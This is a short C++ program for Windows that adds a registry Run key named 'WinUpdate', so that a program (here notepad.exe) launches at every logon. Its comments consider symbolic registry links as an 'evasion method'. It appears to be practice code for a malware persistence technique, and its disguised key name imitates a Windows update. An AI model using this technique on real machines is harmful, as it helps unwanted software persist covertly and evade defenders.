#include <Windows.h>
#include <string>
#include <iostream>

using namespace std;

#define reg_type HKEY_CURRENT_USER

int main() {

	const string reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	const string key_name = "WinUpdate";
	//Does this have to be the C drive?  Is there a way to make it more generic to fit all use cases instead of assuming windows is on c:\ ?
	const string path = "C:\\Windows\\System32\\notepad.exe";

	HKEY default_key;
	//Come back and look at argument REG_OPTION_NON_VOLATILE.  It supports symbolic links for registry keys (REG_OPTION_CREATE_LINK.  Maybe an evasion method? 
	auto status = RegCreateKeyExA(reg_type, reg_path.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &default_key, NULL);

	status = RegSetValueExA(default_key, key_name.c_str(), 0, REG_SZ, (LPCBYTE)path.c_str(), path.size() + 1);

	return 0;
}
